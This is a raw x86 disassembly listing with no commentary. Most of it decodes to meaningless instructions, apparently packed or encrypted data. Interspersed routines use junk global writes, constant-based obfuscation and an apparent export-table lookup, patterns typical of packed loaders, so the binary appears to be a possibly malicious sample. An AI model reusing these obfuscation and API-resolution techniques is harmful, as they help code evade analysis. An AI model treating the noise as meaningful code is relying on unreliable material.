  404118:	jnp    0x4040c5
  40411a:	into   
  40411b:	jmp    0x404191
  40411d:	sub    edx,DWORD PTR [eax-0x70]
  404120:	sbb    DWORD PTR ds:0x31e741d6,esp
  404126:	mov    ebx,0xb4abb36e
  40412b:	daa    
  40412c:	inc    edx
  40412d:	jmp    0x3f69:0x14bb827
  404134:	in     eax,0xca
  404136:	std    
  404137:	sub    esi,DWORD PTR [ebp+eax*8-0x4a]
  40413b:	imul   ebp,DWORD PTR [edx],0x12
  40413e:	test   DWORD PTR [edx],0xe864f654
  404144:	ret    
  404145:	xchg   ebp,eax
  404146:	adc    eax,0xc1cd5bd8
  40414b:	pop    ebp
  40414c:	adc    ebx,ebx
  40414e:	in     al,0x85
  404150:	cmp    DWORD PTR [edi],0x19
  404153:	fisttp DWORD PTR [edx+eiz*8+0x40]
  404157:	inc    eax
  404158:	(bad)  
  404159:	mov    DWORD PTR [ebx+0x7],edi
  40415c:	add    eax,edx
  40415e:	or     bh,BYTE PTR [edx]
  404160:	call   DWORD PTR [esi]
  404162:	mov    cl,0xda
  404164:	test   BYTE PTR [ebp-0x2c99ca76],dl
  40416a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40416b:	add    al,0xa6
  40416d:	scas   eax,DWORD PTR es:[edi]
  40416e:	fistp  QWORD PTR [edx]
  404170:	xor    BYTE PTR [ebp+0x7c],ah
  404173:	inc    esi
  404174:	xchg   ebx,ecx
  404176:	and    al,0x38
  404178:	out    dx,eax
  404179:	fadd   QWORD PTR [ecx+0x7d]
  40417c:	jbe    0x404147
  40417e:	mov    eax,DWORD PTR [ebp+ecx*1-0x6]
  404182:	xor    esi,DWORD PTR [esi-0x34]
  404185:	mov    ebp,DWORD PTR [eax+0x66826b2d]
  40418b:	in     al,0xaa
  40418d:	xor    ah,BYTE PTR ss:[ecx+edx*1]
  404191:	xchg   ecx,eax
  404192:	mov    edi,0x848d6517
  404197:	adc    BYTE PTR [ebx-0x76ffcd8e],bl
  40419d:	inc    ebp
  40419e:	or     bh,bh
  4041a0:	inc    ebp
  4041a1:	or     al,0xe9
  4041a3:	arpl   ax,di
  4041a5:	(bad)  
  4041a6:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	xor    eax,0x528b4919
  4041da:	sbb    edi,DWORD PTR [esi+0x7e]
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x404166
  4041e2:	dec    ebp
  4041e3:	jae    0x40420f
  4041e5:	xlat   BYTE PTR ds:[ebx]
  4041e6:	inc    ecx
  4041e7:	jg     0x404182
  4041e9:	pop    esp
  4041ea:	inc    edx
  4041eb:	aas    
  4041ec:	xchg   edi,eax
  4041ed:	in     eax,dx
  4041ee:	sti    
  4041ef:	iret   
  4041f0:	popa   
  4041f1:	test   ebx,eax
  4041f3:	popf   
  4041f4:	(bad)  
  4041f6:	clc    
  4041f7:	lods   al,BYTE PTR ds:[esi]
  4041f8:	call   0x6db6:0x44ec56a2
  4041ff:	data16 adc ah,dl
  404202:	push   esp
  404203:	outs   dx,DWORD PTR ds:[esi]
  404204:	int3   
  404205:	add    BYTE PTR [ebp+0x76],dh
  404208:	add    al,0xac
  40420a:	ss jcxz 0x40422b
  40420e:	leave  
  40420f:	mov    al,0xb5
  404211:	xor    DWORD PTR [ebx+ebp*8],ecx
  404214:	jb     0x40426a
  404216:	stos   BYTE PTR es:[edi],al
  404217:	push   esp
  404218:	add    BYTE PTR [ebx],0x46
  40421b:	mov    ebx,0x3a93517
  404220:	pop    edi
  404221:	mul    BYTE PTR [esi+edx*2+0x71]
  404225:	div    BYTE PTR [edi-0x1c42885]
  40422b:	ins    BYTE PTR es:[edi],dx
  40422c:	test   eax,0x4eab823a
  404231:	sbb    DWORD PTR [esi+0x3cf9f378],ecx
  404237:	sbb    BYTE PTR [ecx+0x7c4b4a11],dh
  40423d:	xchg   esi,eax
  40423e:	test   DWORD PTR [eax],ebp
  404240:	pop    esp
  404241:	rol    BYTE PTR [ebx],cl
  404243:	inc    ebx
  404244:	not    DWORD PTR [esi]
  404246:	dec    ecx
  404247:	shl    BYTE PTR [eax-0x16],1
  40424a:	mov    dl,0x2c
  40424c:	ins    DWORD PTR es:[edi],dx
  40424d:	push   ds
  40424e:	leave  
  40424f:	or     ecx,ecx
  404251:	cmc    
  404252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404253:	cmp    eax,esi
  404255:	push   ebx
  404256:	or     eax,0xdafdd6e
  40425b:	rcl    BYTE PTR [edx],cl
  40425d:	mov    ebp,0x5c179e5a
  404262:	cmp    bl,ch
  404264:	out    0x64,eax
  404266:	mov    dl,0xe4
  404268:	cmp    edx,ecx
  40426a:	rcl    ebx,cl
  40426c:	inc    eax
  40426d:	gs fxch st(6)
  404270:	jge    0x404230
  404272:	mov    bh,0x2e
  404274:	mov    eax,ds:0x87a10f48
  404279:	inc    ebp
  40427a:	xor    DWORD PTR [edx],edi
  40427c:	cld    
  40427d:	or     BYTE PTR [edx],dh
  40427f:	pushf  
  404280:	loop   0x404215
  404282:	clc    
  404283:	dec    eax
  404284:	pop    edi
  404285:	(bad)  
  404286:	xchg   cl,dl
  404288:	push   0xdae4fb47
  40428d:	mov    BYTE PTR [eax],dl
  40428f:	es sub DWORD PTR es:[eiz*4-0x59c42e75],esi
  404298:	lahf   
  404299:	inc    esp
  40429a:	pop    edx
  40429b:	test   DWORD PTR [edi-0x2],ebx
  40429e:	les    edx,FWORD PTR [eax+0x1f]
  4042a1:	cmp    ah,BYTE PTR [ebx+edi*8]
  4042a4:	inc    ebx
  4042a5:	cld    
  4042a6:	das    
  4042a7:	push   edi
  4042a8:	test   DWORD PTR [ecx],esp
  4042aa:	in     eax,dx
  4042ab:	push   0x43
  4042ad:	jne    0x404303
  4042af:	(bad)  
  4042b0:	xchg   ebp,eax
  4042b1:	cs mov edi,esi
  4042b4:	in     eax,dx
  4042b5:	pop    ss
  4042b6:	out    0xfb,eax
  4042b8:	call   0xde9c6a67
  4042bd:	dec    DWORD PTR [edi-0x22a4db6d]
  4042c3:	mov    BYTE PTR [ebp+0x52],0xdc
  4042c7:	and    ebp,0xd
  4042ca:	retf   
  4042cb:	jp     0x404307
  4042cd:	les    ebx,FWORD PTR [esi+edx*1-0x278990f5]
  4042d4:	dec    esp
  4042d5:	pop    ebx
  4042d6:	inc    esi
  4042d7:	pop    ecx
  4042d8:	pop    ds
  4042d9:	dec    ebp
  4042da:	sub    al,0xc9
  4042dc:	mov    DWORD PTR [ebx-0x4ddc4c1],edi
  4042e2:	hlt    
  4042e3:	push   ds
  4042e4:	xchg   edi,eax
  4042e5:	jae    0x4042ea
  4042e7:	and    bl,dl
  4042e9:	sar    esp,0xea
  4042ec:	popf   
  4042ed:	in     al,0xed
  4042ef:	fidivr DWORD PTR [esi+0x11]
  4042f2:	dec    edi
  4042f3:	loop   0x4042f1
  4042f5:	xor    al,BYTE PTR [esp+edx*2-0x11]
  4042f9:	sbb    al,0xe9
  4042fb:	jp     0x404295
  4042fd:	outs   dx,BYTE PTR ds:[esi]
  4042fe:	and    bh,ah
  404300:	push   edx
  404301:	aaa    
  404302:	repnz dec edx
  404304:	sub    ebp,DWORD PTR [eax+0x7fb9cf43]
  40430a:	das    
  40430b:	stos   DWORD PTR es:[edi],eax
  40430c:	inc    ebp
  40430d:	les    eax,FWORD PTR [ebp+0x71]
  404310:	jnp    0x4042f0
  404312:	mul    esi
  404314:	lahf   
  404315:	nop
  404316:	jge    0x4042b8
  404318:	or     al,0x16
  40431a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40431b:	ins    BYTE PTR es:[edi],dx
  40431c:	aas    
  40431d:	xlat   BYTE PTR ds:[ebx]
  40431e:	clc    
  40431f:	pusha  
  404320:	out    0x57,al
  404322:	std    
  404323:	retf   0x44fc
  404326:	dec    esp
  404327:	aas    
  404328:	push   ebx
  404329:	xchg   ecx,eax
  40432a:	retf   0xfae9
  40432d:	mov    DWORD PTR [esi+0x743cee13],esp
  404333:	in     eax,0x8c
  404335:	cmp    al,0xb1
  404337:	and    al,0xbb
  404339:	xchg   edx,eax
  40433a:	mov    ss,ecx
  40433c:	sub    esp,DWORD PTR [edx+ecx*1]
  40433f:	inc    ebx
  404340:	xchg   ch,cl
  404342:	push   ebx
  404343:	jbe    0x4042e7
  404345:	lock repz popa 
  404348:	jae    0x404332
  40434a:	ins    BYTE PTR es:[edi],dx
  40434b:	fldenv [ebx]
  40434d:	push   0x5cf8586
  404352:	push   eax
  404353:	dec    BYTE PTR [esi+eiz*8-0x5e4bae5c]
  40435a:	dec    ecx
  40435b:	fcmovu st,st(3)
  40435d:	add    eax,0xf4f18b6d
  404362:	dec    esi
  404363:	xchg   edx,eax
  404364:	sbb    BYTE PTR [ebx],0x72
  404367:	aad    0x14
  404369:	rcr    BYTE PTR [esi-0x53],0xd8
  40436d:	daa    
  40436e:	mov    dx,0x9d8f
  404372:	stos   BYTE PTR es:[edi],al
  404373:	inc    ebp
  404374:	cs out dx,al
  404376:	test   al,0xa6
  404378:	bound  ecx,QWORD PTR [edx+0x3da561fc]
  40437e:	xchg   BYTE PTR [eax+0x7d609351],ch
  404384:	mov    esi,0xc78fa845
  404389:	inc    ebp
  40438a:	cld    
  40438b:	xor    al,BYTE PTR [ebp+0x458bf89c]
  404391:	cld    
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42ec6f,0x42e640
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ec67,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x4302b5,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42ec6f,0x4302b5
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x43035f,0x42e648
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e64c,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ec63,0x42ec6b
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42ec6b,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x4302cd,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	sahf   
  40442d:	test   BYTE PTR [esi],dl
  40442f:	cmp    ch,0x19
  404432:	jle    0x4044b2
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x404452
  404439:	or     DWORD PTR [edi+eiz*2+0x39b8d883],0xffffff80
  404441:	mov    dl,0xe4
  404443:	inc    esi
  404444:	aas    
  404445:	push   es
  404446:	inc    ebx
  404447:	pop    esi
  404448:	ds pushw 0xffc3
  40444c:	mov    al,ds:0x21eb0a7c
  404451:	add    eax,0x72c651d
  404456:	push   edx
  404457:	and    dh,ch
  404459:	xor    DWORD PTR [ebp-0x11],eax
  40445c:	stos   DWORD PTR es:[edi],eax
  40445d:	mov    ah,0x49
  40445f:	push   ebp
  404460:	jg     0x4044ab
  404462:	add    ebp,eax
  404464:	jmp    0xe8a73d56
  404469:	sub    ch,BYTE PTR [eax+0x66]
  40446c:	mov    ds:0x33f4a120,eax
  404471:	mov    ebp,0x7f73127a
  404476:	(bad)  
  404477:	mov    al,0x9
  404479:	sbb    esi,DWORD PTR [ecx+ecx*8+0x4e]
  40447d:	(bad)  
  404480:	repnz stc 
  404482:	jns    0x404431
  404484:	std    
  404485:	repnz lds eax,FWORD PTR [edx+0x11c2a67b]
  40448c:	push   ds
  40448d:	sub    BYTE PTR [eax-0x5b],dh
  404490:	(bad)  
  404491:	fdiv   QWORD PTR [esi+0x9]
  404494:	pushf  
  404495:	aaa    
  404496:	mov    ss,WORD PTR [edx+0x66]
  404499:	inc    edx
  40449a:	push   eax
  40449b:	scas   al,BYTE PTR es:[edi]
  40449c:	mov    bh,0xb6
  40449e:	jae    0x404474
  4044a0:	rol    DWORD PTR [ebp+0x46a61bd9],cl
  4044a6:	and    edx,DWORD PTR [esi+ecx*2-0x47a9baab]
  4044ad:	test   eax,0x388d4481
  4044b2:	jg     0x4044bf
  4044b4:	sub    bl,BYTE PTR [esi]
  4044b6:	jmp    0x7da3fa6e
  4044bb:	ret    
  4044bc:	jge    0x4044a5
  4044be:	xacquire xchg BYTE PTR [ebx-0x389c48a],ch
  4044c5:	inc    edi
  4044c6:	cld    
  4044c7:	icebp  
  4044c8:	adc    al,0x4c
  4044ca:	ror    DWORD PTR [ebp-0x3ade2b59],cl
  4044d0:	loop   0x40452b
  4044d2:	mov    ebx,0x471fe5eb
  4044d7:	inc    edx
  4044d8:	mov    WORD PTR [ebp-0x119ce491],gs
  4044de:	loop   0x40453b
  4044e0:	cli    
  4044e1:	mov    bh,cl
  4044e3:	push   esp
  4044e4:	xchg   ebp,eax
  4044e5:	ins    BYTE PTR es:[edi],dx
  4044e6:	int    0x9b
  4044e8:	mov    al,0xe6
  4044ea:	xor    DWORD PTR [eax+0x74],edi
  4044ed:	add    dh,al
  4044ef:	mov    ebp,0x2abbd6b5
  4044f4:	sub    eax,0xbf972b49
  4044f9:	jg     0x4044ce
  4044fb:	sub    DWORD PTR [edx],0x2a50bc2
  404501:	mov    edi,0xd7220a52
  404506:	inc    eax
  404507:	(bad)  
  404508:	mov    edi,0x2bcb353a
  40450d:	and    ebp,DWORD PTR [eax-0x54]
  404510:	lock shl DWORD PTR ss:[eax+0x4669713a],1
  404518:	imul   edx,DWORD PTR [edi],0x13965144
  40451e:	push   eax
  40451f:	inc    edi
  404520:	push   ebx
  404521:	loop   0x4044de
  404523:	das    
  404524:	loop   0x4044c1
  404526:	sub    eax,0x459e4859
  40452b:	shr    DWORD PTR [eax-0x7],cl
  40452e:	push   ebx
  40452f:	mov    esp,0xf9ff2740
  404534:	(bad)  
  404535:	jecxz  0x40450c
  404537:	or     eax,0xa71c7a9e
  40453c:	and    dh,bh
  40453e:	inc    edx
  40453f:	repz cmp eax,0x49e6cd4f
  404545:	test   eax,0x2ad449ed
  40454a:	outs   dx,DWORD PTR ds:[esi]
  40454b:	dec    ebx
  40454c:	add    DWORD PTR [esp+eiz*2+0x48],eax
  404550:	stos   DWORD PTR es:[edi],eax
  404551:	fcmovu st,st(4)
  404553:	dec    ebx
  404554:	rol    BYTE PTR [ecx-0x384fe307],1
  40455a:	sub    bl,dh
  40455c:	lods   al,BYTE PTR ds:[esi]
  40455d:	inc    edi
  40455e:	cli    
  40455f:	dec    eax
  404560:	enter  0x230e,0x5
  404564:	out    dx,eax
  404565:	(bad)  
  404566:	out    dx,eax
  404567:	jg     0x4045b3
  404569:	add    al,0x15
  40456b:	in     al,0x49
  40456d:	lahf   
  40456e:	push   cs
  40456f:	dec    esp
  404570:	add    ch,BYTE PTR [eax-0x2dc2e29e]
  404576:	aam    0xc6
  404578:	repnz nop
  40457a:	test   al,0x78
  40457c:	out    dx,eax
  40457d:	iret   
  40457e:	adc    DWORD PTR ds:0x28ac10f2,eax
  404584:	test   esi,ecx
  404586:	jae    0x404516
  404588:	inc    ecx
  404589:	into   
  40458a:	sub    esi,ecx
  40458c:	test   eax,0xae171a91
  404591:	outs   dx,DWORD PTR ds:[esi]
  404592:	aad    0x46
  404594:	fild   WORD PTR [eax]
  404596:	loop   0x4045ce
  404598:	jbe    0x40457e
  40459a:	sbb    ebp,DWORD PTR [edx]
  40459c:	or     BYTE PTR gs:0x1e3d937,dh
  4045a3:	pop    ds
  4045a4:	shl    DWORD PTR [edi],cl
  4045a6:	cmp    dl,bh
  4045a8:	rcl    DWORD PTR [esi-0x35],cl
  4045ab:	addr16 xchg ebx,eax
  4045ad:	adc    al,dh
  4045af:	cld    
  4045b0:	lea    esp,[ebx-0x448f6427]
  4045b6:	mov    edx,0xeab44eeb
  4045bb:	mov    ebp,0x85eef600
  4045c0:	and    bh,dl
  4045c2:	jnp    0x4045f1
  4045c4:	imul   DWORD PTR [ebp+0x2f]
  4045c7:	push   esi
  4045c8:	mov    ds:0xe2682957,eax
  4045cd:	cmp    BYTE PTR [esi+0x2cf2aab4],ah
  4045d3:	sahf   
  4045d4:	pop    edx
  4045d5:	es loope 0x404634
  4045d8:	inc    DWORD PTR [esi+0x3d]
  4045db:	dec    esp
  4045dc:	call   0xc1437ce7
  4045e1:	add    esi,ecx
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x430367,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x4302b9,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x4302b9
  40460c:	inc    eax
  40460d:	mov    ds:0x4302b9,eax
  404612:	cmp    DWORD PTR ds:0x4302b9,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x4302b9,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ea93
  404650:	cmp    DWORD PTR ds:0x4302b9,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x4302b9
  404662:	inc    eax
  404663:	mov    ds:0x4302b9,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42ec53,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x4302b9,0x4302f1
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x4302dd,0x42ec5b
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x40471c
  4046fa:	or     DWORD PTR [ecx-0x3a],0x7e7e2724
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x40468d
  404706:	retf   0x807f
  404709:	and    BYTE PTR [edi-0x30f7d776],cl
  40470f:	push   DWORD PTR [esi+0x7b]
  404712:	scas   eax,DWORD PTR es:[edi]
  404713:	mov    cl,0xef
  404715:	dec    edi
  404716:	jecxz  0x404713
  404718:	repz jg 0x404783
  40471b:	mov    BYTE PTR [edx+0x5],0xa5
  40471f:	lahf   
  404720:	push   edx
  404721:	push   ebp
  404722:	mul    BYTE PTR [ecx-0x2fb37b27]
  404728:	scas   eax,DWORD PTR es:[edi]
  404729:	repnz xchg ebx,eax
  40472b:	add    al,0xc4
  40472d:	popf   
  40472e:	push   ds
  40472f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404730:	mov    al,0x99
  404732:	adc    DWORD PTR [ebx],eax
  404734:	cmp    esi,eax
  404736:	retf   0xca98
  404739:	inc    ecx
  40473a:	retf   
  40473b:	mov    dh,0x44
  40473d:	push   ecx
  40473e:	(bad)  
  40473f:	jns    0x404746
  404741:	es (bad) 
  404743:	enter  0x24ad,0x2c
  404747:	jp     0x4047a9
  404749:	mov    ch,0x5a
  40474b:	int    0xa1
  40474d:	mov    ebp,0x1c41ed5c
  404752:	ror    BYTE PTR [bx-0x8],1
  404756:	bnd jnp 0x40476d
  404759:	and    cl,BYTE PTR [ecx+ebp*1+0x3ba9ff32]
  404760:	je     0x404704
  404762:	imul   esp,DWORD PTR [ebx+0x6026c61c],0x6aafaa7b
  40476c:	out    dx,eax
  40476d:	int    0x33
  40476f:	out    dx,al
  404770:	mov    al,ds:0x359a691d
  404775:	mov    eax,0x5593c212
  40477a:	pop    ds
  40477b:	fiadd  WORD PTR [esi]
  40477d:	sbb    al,0x23
  40477f:	adc    DWORD PTR [edi],edi
  404781:	and    DWORD PTR [ebp-0x233071e],0xffffffab
  404788:	xchg   ecx,eax
  404789:	sbb    eax,0x7e08af45
  40478e:	test   BYTE PTR [edx],dh
  404790:	popf   
  404791:	pop    edi
  404792:	xchg   esi,eax
  404793:	add    esp,DWORD PTR [ebx-0x641f5c34]
  404799:	inc    ebp
  40479a:	or     edi,DWORD PTR [eax+0x3509ee98]
  4047a0:	sub    BYTE PTR [ebp-0x2bccbac2],ah
  4047a6:	inc    edi
  4047a7:	jg     0x40472c
  4047a9:	mov    eax,0xdfd8b8aa
  4047ae:	ins    DWORD PTR es:[edi],dx
  4047af:	sti    
  4047b0:	ins    BYTE PTR es:[edi],dx
  4047b1:	sub    BYTE PTR [ecx+0x3bac4192],dl
  4047b7:	(bad)  
  4047b8:	jbe    0x4047ba
  4047ba:	jbe    0x404801
  4047bc:	add    al,bh
  4047be:	jmp    0x2e6a:0x1bae8cd8
  4047c5:	fisub  WORD PTR [ecx-0x159499a9]
  4047cb:	xor    DWORD PTR [ebp+0x4f],esi
  4047ce:	fxch   st(3)
  4047d0:	test   eax,edx
  4047d2:	shl    BYTE PTR cs:[edx+0xe696418],1
  4047d9:	sahf   
  4047da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047db:	daa    
  4047dc:	idiv   BYTE PTR [ebx-0x41]
  4047df:	out    dx,al
  4047e0:	retf   
  4047e1:	xchg   esi,eax
  4047e2:	mov    ebx,0x35abfaa2
  4047e7:	adc    DWORD PTR [ecx+ebp*1],eax
  4047ea:	adc    dh,ch
  4047ec:	iret   
  4047ed:	mov    esi,0xe8b141fb
  4047f2:	sub    dh,BYTE PTR [eax+esi*4]
  4047f5:	cmp    al,0x47
  4047f7:	mov    BYTE PTR [bp+di-0x2],cl
  4047fb:	sbb    al,0xe0
  4047fd:	ins    BYTE PTR es:[edi],dx
  4047fe:	adc    al,BYTE PTR [edi+0x6f]
  404801:	jns    0x4047a5
  404803:	aaa    
  404804:	fldcw  WORD PTR [edi-0x2]
  404807:	lock stos BYTE PTR es:[edi],al
  404809:	loope  0x4047dd
  40480b:	lods   al,BYTE PTR ds:[esi]
  40480c:	ret    
  40480d:	xchg   DWORD PTR [eax],esi
  40480f:	dec    ecx
  404810:	add    ecx,DWORD PTR [edx]
  404812:	jns    0x40483b
  404814:	ret    0x70aa
  404817:	(bad)  
  404818:	pop    ss
  404819:	ds sbb al,0xe6
  40481c:	sbb    eax,0x7ee7a536
  404821:	retf   0xf848
  404824:	sbb    bl,ch
  404826:	or     DWORD PTR ds:0x703c62a,ecx
  40482c:	xor    al,0x96
  40482e:	(bad)  
  40482f:	xor    BYTE PTR [edi-0x24b3aca8],ch
  404835:	sub    al,0x61
  404837:	jne    0x40483d
  404839:	push   eax
  40483a:	outs   dx,DWORD PTR ds:[esi]
  40483b:	sub    al,0x6a
  40483d:	and    al,0x67
  40483f:	sub    BYTE PTR [ecx+ebp*8],cl
  404842:	ret    0xc9f
  404845:	push   cs
  404846:	pop    edx
  404847:	push   edx
  404848:	les    eax,FWORD PTR [ecx+0x52e3202f]
  40484e:	push   ebx
  40484f:	ss pop es
  404851:	in     eax,dx
  404852:	cmp    al,0x84
  404854:	bound  ecx,QWORD PTR [ebp-0x76ceff3a]
  40485a:	pusha  
  40485b:	stos   BYTE PTR es:[edi],al
  40485c:	pop    esi
  40485d:	mov    edx,0x40202a26
  404862:	in     eax,0xa7
  404864:	xchg   esi,eax
  404865:	stos   DWORD PTR es:[edi],eax
  404866:	push   ecx
  404867:	adc    DWORD PTR [edx+edx*4+0x20],0x74c4175c
  40486f:	enter  0xbe09,0x30
  404873:	pop    ss
  404874:	sub    BYTE PTR [eax],ah
  404876:	xchg   ecx,edx
  404878:	mov    dl,0xb6
  40487a:	pop    edx
  40487b:	inc    edi
  40487c:	mov    ebp,0xf80ab718
  404881:	ds inc eax
  404883:	cs clc 
  404885:	lods   al,BYTE PTR ds:[esi]
  404886:	pop    esp
  404887:	mov    ebx,0x93f7275d
  40488c:	imul   ecx,DWORD PTR [ecx-0xe],0xffffffba
  404890:	shl    DWORD PTR [edx+ebx*2+0x1ea819dc],0xd9
  404898:	add    DWORD PTR [eax-0x720255a9],0xbd9efb3b
  4048a2:	sar    BYTE PTR [eax],1
  4048a4:	or     eax,0x4aabacc0
  4048a9:	imul   ebp,eax,0x31
  4048ac:	(bad)  
  4048ad:	and    DWORD PTR [ebp-0x777b8952],esi
  4048b3:	aad    0x38
  4048b5:	cmp    ebp,DWORD PTR [edi]
  4048b7:	sub    DWORD PTR [esi+0x9],edx
  4048ba:	cmp    edi,DWORD PTR [esi+0x119c60ce]
  4048c0:	lock xor DWORD PTR [edi+eiz*8+0x7b],0x3d2cfc01
  4048c9:	in     eax,dx
  4048ca:	mov    ss,WORD PTR [eax-0x31320038]
  4048d0:	jnp    0x404951
  4048d2:	push   ds
  4048d3:	mov    edx,0xdec81685
  4048d8:	into   
  4048d9:	push   ebx
  4048da:	out    0xa0,eax
  4048dc:	mov    ah,0x3e
  4048de:	daa    
  4048df:	sub    dl,BYTE PTR [ecx+esi*4]
  4048e2:	adc    BYTE PTR [ecx+0x711d4d7b],dl
  4048e8:	push   eax
  4048e9:	pop    ecx
  4048ea:	ficomp DWORD PTR [esi+0x42]
  4048ed:	cdq    
  4048ee:	enter  0x858b,0x5
  4048f2:	xor    BYTE PTR [esi-0x50fa9389],bl
  4048f8:	stos   BYTE PTR es:[edi],al
  4048f9:	xor    al,0x8
  4048fb:	cmp    eax,0xb7faaea1
  404900:	test   eax,0xbad7ff9
  404905:	imul   ebp,esp,0xbaea5719
  40490b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40490c:	(bad)  
  40490d:	mov    ecx,0x71dcab23
  404912:	adc    edi,edi
  404914:	dec    esi
  404915:	sbb    eax,0x9c118981
  40491a:	sbb    BYTE PTR ds:0x989e6672,cl
  404920:	fcmovnu st,st(3)
  404922:	scas   eax,DWORD PTR es:[edi]
  404923:	repnz stos BYTE PTR es:[edi],al
  404925:	inc    eax
  404926:	call   0x3283:0x63b87123
  40492d:	jns    0x40490e
  40492f:	lds    esp,FWORD PTR ds:0x6769a982
  404935:	in     eax,0x78
  404937:	out    0x20,eax
  404939:	adc    eax,0xbaee2678
  40493e:	lea    edx,[ebx+0x455b57ad]
  404944:	xor    DWORD PTR [ebx-0x7ee5c3c2],ecx
  40494a:	xor    al,0x87
  40494c:	inc    eax
  40494d:	mov    ah,0x19
  40494f:	fs or  eax,0x76ff57fd
  404955:	mov    bh,0x3
  404957:	lock dec BYTE PTR [edx-0xf]
  40495b:	fwait
  40495c:	pop    ds
  40495d:	cmp    bl,BYTE PTR [esi-0x80]
  404960:	or     ebx,ecx
  404962:	imul   esp,DWORD PTR ds:0x11e73b8b,0x5a
  404969:	(bad)  
  40496a:	xchg   edx,eax
  40496b:	pushf  
  40496c:	jns    0x4048ff
  40496e:	mov    BYTE PTR [edx],cl
  404970:	and    dh,BYTE PTR [ebp-0x4b]
  404973:	sbb    bh,BYTE PTR [esi-0x7]
  404976:	sar    ebx,1
  404978:	es into 
  40497a:	out    0xb1,eax
  40497c:	sbb    ch,BYTE PTR [eax-0x410419cf]
  404982:	sbb    BYTE PTR [edx-0x49],cl
  404985:	not    ebx
  404987:	rol    DWORD PTR [ebp-0x4e],0x4d
  40498b:	inc    esi
  40498c:	inc    eax
  40498d:	push   esp
  40498e:	push   ecx
  40498f:	dec    ebp
  404990:	cmp    al,0x0
